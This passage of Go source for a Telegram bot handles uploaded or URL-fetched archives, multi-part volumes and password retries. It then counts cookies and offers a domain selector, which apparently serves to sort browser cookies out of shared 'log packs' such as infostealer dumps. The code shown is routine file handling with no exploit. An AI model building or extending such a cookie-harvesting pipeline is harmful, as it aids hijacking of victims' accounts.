		fmt.Fprintf(&b, "\n⬇️ fetched `%s` in `%s` @ `%.1f MB/s` (`%dx`)",
			formatBytes(s.DownloadInfo.Bytes), s.DownloadInfo.Duration.Round(time.Second),
			mbps, s.DownloadInfo.Parallel)
	}
	editStatus(bot, sentFrom(packMsg), b.String())

	if s.SelectorMsgID != 0 {
		bot.DeleteMessage(s.ChatID, s.SelectorMsgID)
	}
	cleanupSession(s)
}

func startSessionFromFile(bot *Bot, m *telegram.NewMessage) {
	doc := m.Document()
	if doc == nil {
		return
	}
	name := docFileName(doc)

	// Mid multi-part session: accept ANY document as another volume.
	if s := getActiveSessionByChat(m.ChatID()); s != nil && s.State == StateAwaitingParts {
		if !isPartFileAccepted(name) {
			reply(bot, m, "couldn't use that file name — send the part again or `/done`")
			return
		}
		addArchivePart(bot, m, s)
		return
	}

	if !isArchiveUploadName(name) {
		reply(bot, m, "send a `.zip` / `.rar` / `.7z` (any part is fine: `.part2.rar`, `.r00`, `.001`, `.z01`…)")
		return
	}

	filter, pass := parseCaptionMeta(m.Text())
	s := startSession(m.ChatID(), m.SenderID(), name, filter)
	if pass != "" {
		s.CaptionPassword = pass
		log.Printf("caption password candidate for chat=%d (len=%d) — will try only if archive is encrypted", m.ChatID(), len(pass))
	}
	destName := sanitizeArchiveFilename(name)
	s.ArchivePath = filepath.Join(s.JobDir, destName)
	statusMsg, _ := bot.SendHTML(s.ChatID, statusDownloadStart(name))
	s.StatusMsgID = int(statusMsg.ID)

	var lastPct = -1.0
	prog := func(done, total int64, bps float64) {
		pct := 0.0
		if total > 0 {
			pct = float64(done) / float64(total) * 100
		}
		// skip tiny pct jitter so the bar doesn't flicker / overlap on TG
		if lastPct >= 0 && pct-lastPct < 0.4 && done < total {
			return
		}
		lastPct = pct
		editStatusCard(bot, sentFrom(statusMsg), statusDownload(name, done, total, bps))
	}
	if err := bot.DownloadMessage(m, s.ArchivePath, prog); err != nil {
		editStatus(bot, sentFrom(statusMsg), friendlyError(err))
		cleanupSession(s)
		return
	}

	if shouldAwaitArchiveParts(name) {
		s.State = StateAwaitingParts
		editStatusCard(bot, sentFrom(statusMsg), fmt.Sprintf(
			"📎 <b>part saved</b>\n<code>%s</code>\n\n"+
				"send more parts if you have them, then <code>/done</code>\n"+
				"<i>incomplete sets still extract · order doesn't matter</i>\n"+
				"<code>/cancel</code> to abort",
			htmlEsc(shortName(destName, 48))))
		return
	}

	finishExtractAndShow(bot, s, sentFrom(statusMsg))
}

func addArchivePart(bot *Bot, m *telegram.NewMessage, s *Session) {
	doc := m.Document()
	if doc == nil {
		return
	}
	name := docFileName(doc)
	// Any part accepted while collecting (already gated by isPartFileAccepted).
	destName := sanitizeArchiveFilename(name)
	// Avoid clobbering if same name arrives twice
	destPath := filepath.Join(s.JobDir, destName)
	if st, err := os.Stat(destPath); err == nil && st.Size() > 0 {
		destName = fmt.Sprintf("%s_%d%s", strings.TrimSuffix(destName, filepath.Ext(destName)),
			time.Now().UnixNano()%100000, filepath.Ext(destName))
		destPath = filepath.Join(s.JobDir, destName)
	}
	statusMsg := msgRef(s.ChatID, s.StatusMsgID)

	if err := bot.DownloadMessage(m, destPath, nil); err != nil {
		editStatus(bot, statusMsg, friendlyError(err))
		return
	}

	n := countJobParts(s.JobDir)
	editStatusCard(bot, statusMsg, fmt.Sprintf(
		"📎 <b>%d part(s) saved</b>\nlatest: <code>%s</code>\n\n"+
			"<i>any part is fine · order doesn't matter</i>\n"+
			"send more or <code>/done</code> · incomplete OK\n"+
			"<code>/cancel</code> to abort",
		n, htmlEsc(shortName(destName, 48))))
}

func countJobParts(dir string) int {
	n := 0
	entries, err := os.ReadDir(dir)
	if err != nil {
		return 0
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if strings.HasPrefix(name, rarJoinBase) || strings.HasPrefix(name, "__zipjoin") ||
			strings.HasPrefix(name, "__7zout") || strings.HasSuffix(name, ".spool") {
			continue
		}
		n++
	}
	return n
}

func finishMultipartUpload(bot *Bot, m *telegram.NewMessage, s *Session) {
	statusMsg := msgRef(s.ChatID, s.StatusMsgID)
	parts := listJobPartFiles(s.JobDir)
	if len(parts) == 0 {
		reply(bot, m, "no parts in this session — send any volume(s), then `/done`")
		return
	}

	// Prefer RAR resolution when any rar-like part exists; else zip join; else first file.
	rarVols, _ := listRarVolumes(s.JobDir)
	zipVols, _ := listZipVolumes(s.JobDir)

	var warn *PartialExtractWarning
	openPath := parts[0]
	kind := "archive"

	if len(rarVols) > 0 {
		kind = "rar"
		w, _ := analyzeRarVolumeSet(rarVols)
		warn = w
		if p, pw, err := resolveRarOpenPath(s.JobDir); err == nil {
			openPath = p
			if pw != nil {
				warn = pw
			}
		} else {
			openPath = rarVols[0].path
		}
	} else if len(zipVols) > 0 {
		kind = "zip"
		if joined, pw, err := joinZipVolumes(s.JobDir); err == nil {
			openPath = joined
			warn = pw
		} else {
			openPath = zipVols[0].path
		}
	}

	s.ArchivePath = openPath
	s.ArchiveName = filepath.Base(openPath)
	s.State = StateDownloading

	names := make([]string, len(parts))
	for i, p := range parts {
		names[i] = filepath.Base(p)
	}
	partial := ""
	if warn != nil {
		partial = warn.String()
	}
	editStatusCard(bot, statusMsg, statusMultipart(kind, names, partial))
	finishExtractAndShow(bot, s, statusMsg)
}

func listJobPartFiles(dir string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if strings.HasPrefix(name, rarJoinBase) || strings.HasPrefix(name, "__zipjoin") ||
			strings.HasPrefix(name, "__7zout") || strings.HasSuffix(name, ".spool") ||
			strings.HasSuffix(name, ".session") {
			continue
		}
		out = append(out, filepath.Join(dir, name))
	}
	sort.Strings(out)
	return out
}

func startSessionFromURL(bot *Bot, m *telegram.NewMessage, url string) {
	filter, pass := "", ""
	if rest := strings.TrimSpace(strings.Replace(m.Text(), url, "", 1)); rest != "" {
		filter, pass = parseCaptionMeta(rest)
	}
	archName := archiveNameFromURL(url)
	s := startSession(m.ChatID(), m.SenderID(), archName, filter)
	if pass != "" {
		s.CaptionPassword = pass
	}
	s.LastURL = url
	statusMsg, _ := bot.SendText(s.ChatID, fmt.Sprintf(
		"`[1/3]` 🔍 *resolving* `%s`…", escapeMd(archName)))
	s.StatusMsgID = int(statusMsg.ID)
	runURLSession(bot, s, sentFrom(statusMsg))
}

// retryURLSession re-runs the download+extract for a session whose previous
// attempt failed. Invoked by the "↻ retry" inline button. The session is
// preserved (same ID, filter, chat) so the user keeps their context; we just
// reset the failed state and re-enter the pipeline.
func retryURLSession(bot *Bot, cq *telegram.CallbackQuery, s *Session) {
	if s.LastURL == "" {
		bot.AnswerCallback(cq, "no URL to retry")
		return
	}
	bot.AnswerCallback(cq, "retrying…")
	url := s.LastURL

	// Reset transient state so the pipeline starts clean.
	s.mu.Lock()
	s.State = StateDownloading
	s.ArchivePath = ""
	s.SpoolPath = ""
	s.Password = ""
	s.Stats = Stats{}
	s.mu.Unlock()

	statusSent, _ := bot.SendText(s.ChatID, fmt.Sprintf(
		"`[1/3]` ↻ *retrying* `%s`…", escapeMd(archiveNameFromURL(url))))
	statusMsg := sentFrom(statusSent)
	s.StatusMsgID = int(statusSent.ID)
	runURLSession(bot, s, statusMsg)
}

// runURLSession is the shared download→extract pipeline for both fresh URL
// posts and retries. Caller has already created the Session and set LastURL.
func runURLSession(bot *Bot, s *Session, statusMsg SentMsg) {
	url := s.LastURL
	archName := archiveNameFromURL(url)

	downloadName := sanitizeArchiveFilename(archName)
	if downloadName == "" || downloadName == "download" {
		downloadName = "archive"
	}
	s.ArchivePath = filepath.Join(s.JobDir, downloadName)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer cancel()

	lastEdit := time.Now()
	lastPct := -1.0
	prog := func(d, total int64, bps float64) {
		if time.Since(lastEdit) < 2*time.Second {
			return
		}
		pct := 0.0
		if total > 0 {
			pct = float64(d) / float64(total) * 100
		}
		if lastPct >= 0 && pct-lastPct < 0.4 && d < total {
			return
		}
		lastEdit = time.Now()
		lastPct = pct
		editStatusCard(bot, statusMsg, statusDownload(archName, d, total, bps))
	}

	res, err := parallelDownload(ctx, url, s.ArchivePath, DEFAULT_PARALLEL, MAX_ARCHIVE_BYTES_URL, prog)
	if err != nil {
		bot.EditStatusWithKeyboard(statusMsg, friendlyError(err), retryKeyboard(s.ID))
		return
	}

	ext, err := detectArchiveExt(s.ArchivePath)
	if err != nil {
		detail := res.ContentType
		if detail == "" {
			detail = "unknown content-type"
		}
		bot.EditStatusWithKeyboard(statusMsg, fmt.Sprintf(
			"❌ URL returned `%s`, not a `.zip`/`.rar`\nthat page is probably HTML (login/redirect) — paste the *direct* file URL",
			escapeMd(detail)), retryKeyboard(s.ID))
		cleanupSession(s)
		return
	}
	finalPath := filepath.Join(s.JobDir, strings.TrimSuffix(downloadName, filepath.Ext(downloadName))+ext)
	if err := os.Rename(s.ArchivePath, finalPath); err != nil {
		bot.EditStatusWithKeyboard(statusMsg, friendlyError(err), retryKeyboard(s.ID))
		cleanupSession(s)
		return
	}
	s.ArchivePath = finalPath
	if res.FileName != "" {
		archName = res.FileName
	} else if name := archiveNameFromURL(res.FinalURL); name != "download" {
		archName = name
	}
	if archiveExtFromName(archName) == "" {
		archName += ext
	}
	s.ArchiveName = archName
	s.DownloadInfo = res
	editStatusCard(bot, statusMsg, statusDownloadDone(
		res.Bytes, res.Duration.Round(time.Second).String(), res.Parallel))
	finishExtractAndShow(bot, s, statusMsg)
}

func archiveNameFromURL(rawURL string) string {
	name := ""
	if u, err := neturl.Parse(rawURL); err == nil {
		name = filepath.Base(u.Path)
	}
	if name == "" || name == "." || name == "/" {
		name = "download"
	}
	if dec, err := neturl.QueryUnescape(name); err == nil {
		name = dec
	}
	return filepath.Base(name)
}

func finishExtractAndShow(bot *Bot, s *Session, statusMsg SentMsg) {
	stop := startExtractHeartbeat(bot, statusMsg, s)
	err := runArchiveExtraction(s)
	close(stop)

	// Archive needs a password. Try caption candidate once, then ask the user.
	// Never force caption password on first open — pack captions often aren't zip keys.
	if errors.Is(err, ErrPasswordRequired) {
		if s.CaptionPassword != "" && s.Password == "" {
			editStatus(bot, statusMsg, "🔒 encrypted — trying caption password…")
			s.Password = s.CaptionPassword
			stop2 := startExtractHeartbeat(bot, statusMsg, s)
			err = runArchiveExtraction(s)
			close(stop2)
			if err == nil {
				goto success
			}
			if errors.Is(err, ErrBadPassword) {
				s.Password = ""
				s.State = StateAwaitingPassword
				editStatus(bot, statusMsg,
					"🔒 *password required*\n"+
						"caption password didn't unlock it — reply with the *archive* password.\n"+
						"`/cancel` to abort.")
				return
			}
			// other error after caption try — fall through
		} else {
			s.State = StateAwaitingPassword
			editStatus(bot, statusMsg, "🔒 *password required*\nreply with the archive password to unlock it.\n`/cancel` to abort.")
			return
		}
	}

	// Wrong password: KEEP session so the user can reply with another try.
	if errors.Is(err, ErrBadPassword) {
		s.Password = ""
		s.State = StateAwaitingPassword
		editStatus(bot, statusMsg,
			"❌ *wrong password*\nreply with the correct archive password.\n`/cancel` to abort.")
		return
	}

	if errors.Is(err, ErrPasswordRequired) {
		s.State = StateAwaitingPassword
		editStatus(bot, statusMsg, "🔒 *password required*\nreply with the archive password to unlock it.\n`/cancel` to abort.")
		return
	}
	if errors.Is(err, ErrRarPartsMissing) {
		s.State = StateAwaitingParts
		// keep archive parts on disk
		vols, _ := listRarVolumes(s.JobDir)
		editStatus(bot, statusMsg, fmt.Sprintf(
			"📎 *need more rar parts*\nhave: `%s`\n\nsend remaining parts, then `/done`.\n`/cancel` to abort.",
			escapeMd(formatRarVolumeList(vols))))
		return
	}
	if err != nil {
		editStatus(bot, statusMsg, friendlyError(err))
		cleanupSession(s)
		return
	}

success:
	if s.Stats.UniqueCookies == 0 {
		editStatus(bot, statusMsg, noCookiesMessage(s.Stats, s.InitialFilter))
		cleanupSession(s)
		return
	}
	bot.DeleteMessage(s.ChatID, int(statusMsg.MsgID))
	showDomainSelector(bot, s)
}

func handlePasswordReply(bot *Bot, m *telegram.NewMessage, s *Session) {
	pass := strings.TrimSpace(m.Text())
	bot.DeleteMessage(m.ChatID(), int(m.ID))
	if pass == "" {
		bot.SendText(s.ChatID, "send the archive password as text, or `/cancel`")
		return
	}
	// strip accidental "password:" prefix if user pastes a full caption
	if _, extracted := parseCaptionMeta(pass); extracted != "" {
		// if the whole reply looks like a caption, use extracted secret
		if looksLikePasswordCaption(pass) {
			pass = extracted
		}
	}
	s.Password = pass
	s.State = StateDownloading
	statusSent, _ := bot.SendText(s.ChatID, "🔓 trying password…")
	statusMsg := sentFrom(statusSent)
	s.StatusMsgID = int(statusSent.ID)
	stop := startExtractHeartbeat(bot, statusMsg, s)
	err := runArchiveExtraction(s)
	close(stop)
	if errors.Is(err, ErrBadPassword) {
		s.Password = ""
		s.State = StateAwaitingPassword
		editStatus(bot, statusMsg, "❌ *wrong password* — send another one.\n`/cancel` to abort.")
		return
	}
	if errors.Is(err, ErrPasswordRequired) {
		s.Password = ""
		s.State = StateAwaitingPassword
		editStatus(bot, statusMsg, "❌ *still locked* — send another password.\n`/cancel` to abort.")
		return
	}
	if err != nil {
		editStatus(bot, statusMsg, friendlyError(err))
		cleanupSession(s)
		return
	}
	if s.Stats.UniqueCookies == 0 {
		editStatus(bot, statusMsg, noCookiesMessage(s.Stats, s.InitialFilter))
		cleanupSession(s)
		return
	}
	bot.DeleteMessage(s.ChatID, int(statusMsg.MsgID))
	showDomainSelector(bot, s)
}

func fmtDuration(secs float64) string {
	if secs < 60 {
		return fmt.Sprintf("%ds", int(secs))
	}
	if secs < 3600 {
		return fmt.Sprintf("%dm%02ds", int(secs)/60, int(secs)%60)
	}
	return fmt.Sprintf("%dh%02dm", int(secs)/3600, (int(secs)%3600)/60)
}

func startExtractHeartbeat(bot *Bot, statusMsg SentMsg, s *Session) chan struct{} {
	stop := make(chan struct{})
	start := time.Now()
	spinner := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	go func() {
		t := time.NewTicker(2 * time.Second)
		defer t.Stop()
		i := 0
		for {
			select {
			case <-stop:
				return
			case <-t.C:
				elapsed := time.Since(start).Seconds()
				s.mu.Lock()
				spool := s.spool
				s.mu.Unlock()

				if spool == nil {
					ahead := extractQueue.queueLen()
					if ahead > 0 {
						editStatusCard(bot, statusMsg, statusQueued(ahead, fmtDuration(elapsed)))
					} else {
						editStatusCard(bot, statusMsg, statusExtractStarting(fmtDuration(elapsed)))
					}
					i++
					continue
				}

				entries, cookies := spool.Progress()
				epsRate, cpsRate := 0.0, 0.0
				if elapsed > 0 {
					epsRate = float64(entries) / elapsed
					cpsRate = float64(cookies) / elapsed
				}
				editStatusCard(bot, statusMsg, statusExtracting(
					spinner[i%len(spinner)],
					int(entries), int(cookies),
					epsRate, cpsRate,
					fmtDuration(elapsed),
				))
				i++
			}
		}
	}()
	return stop
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "…"
}

func itoa(i int) string { return fmt.Sprintf("%d", i) }
func atoi(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return -1
		}
		n = n*10 + int(c-'0')
	}
	return n
}
